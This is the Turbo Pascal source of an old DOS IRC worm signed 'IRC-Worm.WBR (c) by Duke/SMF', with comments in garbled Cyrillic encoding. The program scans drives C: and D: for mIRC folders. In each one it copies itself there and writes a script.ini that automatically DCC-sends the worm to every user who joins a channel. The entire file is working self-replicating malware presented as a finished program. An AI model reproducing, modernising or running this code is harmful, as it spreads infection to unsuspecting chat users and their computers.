   {$M 2000, 0, 1000}
   program IRC_Worm__WBR;
   uses dos;
   {$I logo.inc}                   {ANSI-à¨áã®ª}
   {$I uncrunch.inc}               {¯à®æ¥¤ãà  ¢ë¢®¤  à¨áãª }
   {--------------------------------}
   procedure MakeWorm(Dir:string); {á®§¤ ¨¥ ä ©«  script.ini}
   var f:text;
       ds:dirstr;
       ns:namestr;
       es:extstr;
   begin
   fsplit(paramstr(0),ds,ns,es);
   assign(f,Dir+'script.ini');rewrite(f);
   writeln(f,'[script]');
   writeln(f,'n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick '+Dir+ns+es+' }');
   writeln(f,'n1=// IRC-Worm.WBR (c) by Duke/SMF');
   close(f);
   exec(GetEnv('COMSPEC'),'/c copy '+paramstr(0)+' '+Dir+ns+es+' >nul');
   end;
   {--------------------------------}
   procedure Search(Dir:string);   {áª ¨à®¢ ¨¥ ¤¨áª  ¨ ¯®¨áª MIRC}
   var N,h:searchrec;
   begin
   if Dir[length(Dir)]<>'\'then Dir:=Dir+'\';
   findfirst(Dir+'mirc*.*',$21,h);
   if doserror=0 then MakeWorm(Dir);
   {¨áª âì ¤àã£¨¥ (¢«®¦¥ë¥) ¤¨à¥ªâ®à¨¨:}
   findfirst(Dir+'*.*',$3F,N);
   while doserror=0 do
     begin
     with N do if (Attr and 16<>0) and (Name[1]<>'.') then Search(Dir+Name);
     findnext(N);
     end;
   end;
   {--------------------------------}
   begin
   UnCrunch(IMAGEDATA,ScreenAddr[(1*2)+(1*160)-162],IMAGEDATA_LENGTH);
   Search('c:');
   Search('d:');
   end.
